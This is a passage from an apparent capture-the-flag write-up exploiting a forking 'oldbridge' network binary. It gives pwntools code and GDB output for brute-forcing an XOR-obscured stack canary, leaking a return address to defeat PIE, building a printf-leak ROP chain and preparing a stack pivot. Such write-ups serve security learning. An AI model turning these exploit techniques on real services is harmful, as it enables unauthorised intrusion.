</code></pre></div><p>But there&rsquo;s nothing more&mldr;</p><h2 id="exploit-development">Exploit development</h2><p>Let&rsquo;s start the exploitation process by obtaining the stack canary value. Since the program is forking on new connections, the parent&rsquo;s process memory is copied to the children processes. Hence, we can use brute force byte by byte to obtain the whole stack canary because the child will crash when the byte is wrong but will give another response when the overwritten byte is correct.</p><p>This is the behavior when we overwrite the stack canary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 1200)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1234  
Username:
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234
*** stack smashing detected ***: terminated  
</code></pre></div><h3 id="brute-force-attack">Brute force attack</h3><p>This is the oracle we need:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 1025)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1234  
Username: Username found!

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 1026)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1234
Username:
</code></pre></div><p>With 6 + 1025 + 1 = 1032 bytes, we get a <code>Username found!</code> message and with one more byte we don&rsquo;t get the message (and the server log shows the <code>*** stack smashing detected ***</code> error).</p><p>This will be the initial exploit to extract the canary by brute force:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>

<span class="mtk5">from</span> <span class="mtk8 mtku">pwn</span> <span class="mtk5">import</span> <span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span> <span class="mtk5">=</span> <span class="mtk4">'oldbridge'</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">get_process</span><span class="mtk1">():</span>
    <span class="mtk5">with</span> <span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
        <span class="mtk5">if</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">2</span><span class="mtk1">:</span>
            <span class="mtk1">port</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]</span>
            <span class="mtk5">return</span> <span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk4">'127.0.0.1'</span><span class="mtk1">,</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>

        <span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk1">port</span> <span class="mtk5">=</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span>
        <span class="mtk5">return</span> <span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">,</span> <span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">:</span> <span class="mtk8 mtku">bytes</span>, <span class="mtk9 mtki">value_name</span><span class="mtk1">:</span> <span class="mtk8 mtku">str</span><span class="mtk1">)</span> <span class="mtk1">-&gt;</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>  
    <span class="mtk1">value</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">''</span>
    <span class="mtk1">value_progress</span> <span class="mtk5">=</span> <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk9 mtki">value_name</span><span class="mtk1">)</span>

    <span class="mtk5">while</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">)</span> <span class="mtk5">&lt;</span> <span class="mtk6">8</span><span class="mtk1">:</span>
        <span class="mtk5">for</span> <span class="mtk1">c</span> <span class="mtk5">in</span> <span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">256</span><span class="mtk1">):</span>
            <span class="mtk1">value_progress</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk8">repr</span><span class="mtk1">(</span><span class="mtk1">value</span> <span class="mtk5">+</span> <span class="mtk1">p8(</span><span class="mtk1">c</span><span class="mtk1">)))</span>

            <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
            <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk9 mtki">payload</span> <span class="mtk5">+</span> <span class="mtk1">value</span> <span class="mtk5">+</span> <span class="mtk1">p8(</span><span class="mtk1">c</span><span class="mtk1">))</span>

            <span class="mtk5">try</span><span class="mtk1">:</span>
                <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
                <span class="mtk1">value</span> <span class="mtk5">+=</span> <span class="mtk1">p8(</span><span class="mtk1">c</span><span class="mtk1">)</span>
            <span class="mtk5">except</span> <span class="mtk8 mtku">EOFError</span><span class="mtk1">:</span>
                <span class="mtk5">pass</span>
            <span class="mtk5">finally</span><span class="mtk1">:</span>
                <span class="mtk5">with</span> <span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>
                    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>

    <span class="mtk1">value_progress</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk8">repr</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">))</span>

    <span class="mtk5">return</span> <span class="mtk1">value</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">1026</span>
    <span class="mtk1">username</span> <span class="mtk5">=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'davide'</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk1">username</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">canary</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span>, <span class="mtk4">'Canary'</span><span class="mtk1">)</span>


<span class="mtk5">if</span> <span class="mtk1">__name__</span> <span class="mtk5">==</span> <span class="mtk4">'__main__'</span><span class="mtk1">:</span>
    <span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>And here we have the canary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: b'\r\xa9%\xf53\x1c\x1e\x8c'  
</code></pre></div><p>But it is weird. By experience, we know that stack canaries start with a null byte to prevent leakage in strings. And here we see a <code>\r</code> (which is <code>0xd</code>). Some of you may have noticed what&rsquo;s happening. For the rest, we can use GDB to compare the values:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">oldbridge</span>
Reading symbols from <span class="code-dark-green">oldbridge</span>...
(No debugging symbols found in <span class="code-dark-green">oldbridge</span>)  
<span class="code-red">gef➤</span>  start 1234
<span class="code-blue">[+]</span> Breaking at '0xc99'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  canary
<span class="code-blue">[+]</span> The canary of process 47056 is at 0x7fffffffea59, value is 0xd7564ed1f6b6e100  
<span class="code-green">gef➤</span>  continue
Continuing.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: b'\r\xec\xbb\xfb\xdcC[\xda'  
</code></pre></div><p>Let&rsquo;s represent the canary value in hexadecimal format:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; from pwn import u64
&gt;&gt;&gt; hex(u64(b'\r\xec\xbb\xfb\xdcC[\xda'))  
'0xda5b43dcfbbbec0d'
</code></pre></div><p>They do not match. Knowing that the first two digits should be <code>00</code> and they are <code>0d</code>, we must remember that there was a XOR encryption with key <code>0xd</code>. In fact, we have got the value of the canary, but encrypted:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; bytes([b ^ 0xd for b in b'\r\xec\xbb\xfb\xdcC[\xda'])  
b'\x00\xe1\xb6\xf6\xd1NV\xd7'
&gt;&gt;&gt; hex(u64(b'\x00\xe1\xb6\xf6\xd1NV\xd7'))
'0xd7564ed1f6b6e100'
</code></pre></div><p>And there we have it. Therefore, our brute force process was correct. Now we can proceed with the next steps.</p><h3 id="pie-bypass">PIE bypass</h3><p>We need to bypass ASLR both for Glibc and the binary (PIE is enabled). We can use the same brute force process because after the stack canary value, we have the saved <code>$rbp</code> from the previous stack frame and then the saved return address.</p><p>Let&rsquo;s check it out in GDB, setting a breakpoint after the <code>read</code> instruction:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">oldbridge</span>
Reading symbols from <span class="code-dark-green">oldbridge</span>...
(No debugging symbols found in <span class="code-dark-green">oldbridge</span>)
<span class="code-red">gef➤</span>  disassemble check_username
Dump of assembler code for function check_username:
   <span class="code-dark-blue">0x0000000000000b6f</span> &lt;+0&gt;:     push   rbp
   <span class="code-dark-blue">0x0000000000000b70</span> &lt;+1&gt;:     mov    rbp,rsp
   <span class="code-dark-blue">0x0000000000000b73</span> &lt;+4&gt;:     sub    rsp,0x430
   <span class="code-dark-blue">0x0000000000000b7a</span> &lt;+11&gt;:    mov    DWORD PTR [rbp-0x424],edi
   ...
   <span class="code-dark-blue">0x0000000000000bad</span> &lt;+62&gt;:    call   <span class="code-dark-blue">0x910</span> &lt;<span class="code-dark-yellow">write@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000bb2</span> &lt;+67&gt;:    lea    rcx,[rbp-0x410]
   <span class="code-dark-blue">0x0000000000000bb9</span> &lt;+74&gt;:    mov    eax,DWORD PTR [rbp-0x424]
   <span class="code-dark-blue">0x0000000000000bbf</span> &lt;+80&gt;:    mov    edx,0x420
   <span class="code-dark-blue">0x0000000000000bc4</span> &lt;+85&gt;:    mov    rsi,rcx
   <span class="code-dark-blue">0x0000000000000bc7</span> &lt;+88&gt;:    mov    edi,eax
   <span class="code-dark-blue">0x0000000000000bc9</span> &lt;+90&gt;:    call   <span class="code-dark-blue">0x970</span> &lt;<span class="code-dark-yellow">read@plt</span>&gt;
   <span class="code-dark-blue">0x0000000000000bce</span> &lt;+95&gt;:    mov    DWORD PTR [rbp-0x414],eax
   <span class="code-dark-blue">0x0000000000000bd4</span> &lt;+101&gt;:   mov    DWORD PTR [rbp-0x418],0x0
   <span class="code-dark-blue">0x0000000000000bde</span> &lt;+111&gt;:   jmp    <span class="code-dark-blue">0xc0b</span> &lt;<span class="code-dark-yellow">check_username+156</span>&gt;
   <span class="code-dark-blue">0x0000000000000be0</span> &lt;+113&gt;:   mov    eax,DWORD PTR [rbp-0x418]
   ...
   <span class="code-dark-blue">0x0000000000000c57</span> &lt;+232&gt;:   call   <span class="code-dark-blue">0x920</span> &lt;<span class="code-dark-yellow">__stack_chk_fail@plt</span>&gt;  
   <span class="code-dark-blue">0x0000000000000c5c</span> &lt;+237&gt;:   leave
   <span class="code-dark-blue">0x0000000000000c5d</span> &lt;+238&gt;:   ret
End of assembler dump.
<span class="code-red">gef➤</span>  break *check_username+95
Breakpoint 1 at <span class="code-dark-blue">0xbce</span>
<span class="code-red">gef➤</span>  set follow-fork-mode child
<span class="code-red">gef➤</span>  run 1234
Starting program: ./oldbridge 1234
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234  
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] b'\0'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Starting program: ./oldbridge 1234
[Attaching after process 61133 fork to child process 61371]
[New inferior 2 (process 61371)]
[Detaching after fork from parent process 61133]
[Inferior 1 (process 61133) detached]
[Switching to process 61371]

Thread 2.1 "oldbridge" hit Breakpoint 1, <span class="code-dark-blue">0x0000555555400bce</span> in <span class="code-dark-yellow">check_username</span> ()  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  canary
<span class="code-blue">[+]</span> The canary of process 61371 is at 0x7fffffffea59, value is 0x7370c9b1cae54f00  
<span class="code-green">gef➤</span>  x/10gx $rsp+0x400
<span class="code-dark-blue">0x7fffffffe620</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe630</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7fffffffe640</span>: 0x4141414141414141      0x7370c9b1cae54f00
<span class="code-dark-blue">0x7fffffffe650</span>: 0x00007fffffffe6c0      0x0000555555400ecf
<span class="code-dark-blue">0x7fffffffe660</span>: 0x00007fffffffe7b8      0x00000002000000f0
<span class="code-green">gef➤</span>  x 0x00007fffffffe6c0
<span class="code-dark-blue">0x7fffffffe6c0</span>: 0x0000000000000000
<span class="code-green">gef➤</span>  x 0x0000555555400ecf
<span class="code-dark-blue">0x555555400ecf</span> &lt;<span class="code-dark-yellow">main</span>+566&gt;:      0xbac8458b1674c085
</code></pre></div><p>There we have the saved <code>$rbp</code> and the saved return address. In order to help the brute force process, we can give the function the first two digits, that will not change presumably. In fact, we are only interested in the return address, because it has an address of the binary at runtime, so we will be able to compute the base address. These are the <code>xor</code> function and the updated <code>main</code> function of the Python exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk9 mtki">payload</span><span class="mtk1">:</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">,</span> <span class="mtk9 mtki">key</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; <span class="mtk8 mtku">bytes</span>:</span>
    <span class="mtk5">return</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">([</span><span class="mtk1">b</span> <span class="mtk5">^</span> <span class="mtk9 mtki">key</span> <span class="mtk5">for</span> <span class="mtk1">b</span> <span class="mtk5">in</span> <span class="mtk9 mtki">payload</span><span class="mtk1">])</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk1">offset</span> <span class="mtk5">=</span> <span class="mtk6">1026</span>
    <span class="mtk1">key</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">d</span>
    <span class="mtk1">username</span> <span class="mtk5">=</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'il{dih'</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">junk</span> <span class="mtk5">=</span> <span class="mtk1">username</span> <span class="mtk5">+</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">offset</span>

    <span class="mtk1">help_canary</span> <span class="mtk5">=</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">help_ret</span> <span class="mtk5">=</span> <span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xcf</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">xor_canary</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span><span class="mtk1">,</span> <span class="mtk4">'XOR</span> <span class="mtk4">Canary'</span><span class="mtk1">,</span> <span class="mtk9 mtki">value</span><span class="mtk5">=</span><span class="mtk1">help_canary</span><span class="mtk1">)</span>
    <span class="mtk1">xor_saved_rbp</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span> <span class="mtk5">+</span> <span class="mtk1">xor_canary</span><span class="mtk1">,</span> <span class="mtk4">'XOR</span> <span class="mtk4">saved</span> <span class="mtk4">$rbp'</span><span class="mtk1">)</span>
    <span class="mtk1">xor_return_addr</span> <span class="mtk5">=</span> <span class="mtk8">bruteforce_value</span><span class="mtk1">(</span><span class="mtk1">junk</span> <span class="mtk5">+</span> <span class="mtk1">xor_canary</span> <span class="mtk5">+</span> <span class="mtk1">xor_saved_rbp</span><span class="mtk1">,</span> <span class="mtk4">'XOR</span> <span class="mtk4">return</span> <span class="mtk4">address'</span><span class="mtk1">,</span> <span class="mtk9 mtki">value</span><span class="mtk5">=</span><span class="mtk1">help_ret</span><span class="mtk1">)</span>  

    <span class="mtk1">canary</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">xor_canary</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
    <span class="mtk1">saved_rbp</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">xor_saved_rbp</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
    <span class="mtk1">return_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk8">xor</span><span class="mtk1">(</span><span class="mtk1">xor_return_addr</span><span class="mtk1">,</span> <span class="mtk1">key</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>

    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Canary:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">canary</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Saved</span> <span class="mtk4">$rbp:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">saved_rbp</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Return</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">return_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b'\rUMW\xc2\xc9\xd6\x9f'
[<span class="code-green">+</span>] XOR saved $rbp: b'\x9d\xc5\x1cG\xf1r\r\r'
[<span class="code-green">+</span>] XOR return address: b'\xc2\x03\xad\x91I[\r\r'  
[<span class="code-green">+</span>] Canary: 0x92dbc4cf5a405800
[<span class="code-green">+</span>] Saved $rbp: 0x7ffc4a11c890
[<span class="code-green">+</span>] Return address: 0x56449ca00ecf
</code></pre></div><p>Now we can easily compute the binary base address by substracting <code>0xecf</code> to the saved return address:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">elf_base_addr</span> <span class="mtk5">=</span> <span class="mtk1">return_addr</span> <span class="mtk5">-</span> <span class="mtk7 mtki">0x</span><span class="mtk6">ecf</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">elf_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
</code></pre></div><p>At this point, we can try to use gadgets like <code>pop rdi; ret</code> to leak an address inside Glibc and bypass ASLR. This would be the values for the ROP chain:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rdi ; ret'</span>
0x0000000000000f73 : <span class="code-red">pop rdi ; ret</span>

<span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -d <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> printf
0000000000000940 &lt;<span class="code-red">printf</span>@plt&gt;:
 940:   ff 25 f2 16 20 00       jmpq   *0x2016f2(%rip)        # 202038 &lt;<span class="code-red">printf</span>@GLIBC_2.2.5&gt;  
 cda:   e8 61 fc ff ff          callq  940 &lt;<span class="code-red">printf</span>@plt&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> check_username
    78: 0000000000000b6f   239 FUNC    GLOBAL DEFAULT   14 <span class="code-red">check_username</span>
</code></pre></div><p>So, this is the ROP chain (notice the XOR encryption):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">pop_rdi_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">f73</span>
    <span class="mtk1">printf_got</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">202038</span>
    <span class="mtk1">printf_plt</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">940</span>
    <span class="mtk1">check_username_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">b6f</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">junk</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_canary</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_saved_rbp</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(pop_rdi_ret_addr), key)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(printf_got), key)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(printf_plt), key)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(check_username_addr), key)</span>  
</code></pre></div><p>But it does not work either in client side or server side. The fact is that there is not enough space for a ROP chain, only for an address that overwrites the return address.</p><h3 id="stack-pivot">Stack Pivot</h3><p>Hence, we must find a way to do a Stack Pivot. Fortunately, we have a <code>helper</code> function to help us perform this technique:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel --disassemble=helper <span class="mtku">oldbridge</span>

oldbridge:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .plt.got:

Disassembly of section .text:

0000000000000b3a &lt;helper&gt;:
 b3a:   55                      push   rbp
 b3b:   48 89 e5                mov    rbp,rsp
 b3e:   48 83 ec 10             sub    rsp,0x10
 b42:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
 b49:   00 00
 b4b:   48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
 b4f:   31 c0                   xor    eax,eax
 b51:   58                      pop    rax
 b52:   c3                      ret
 b53:   5a                      pop    rdx
 b54:   c3                      ret
 b55:   0f 05                   syscall
 b57:   c3                      ret
 b58:   90                      nop
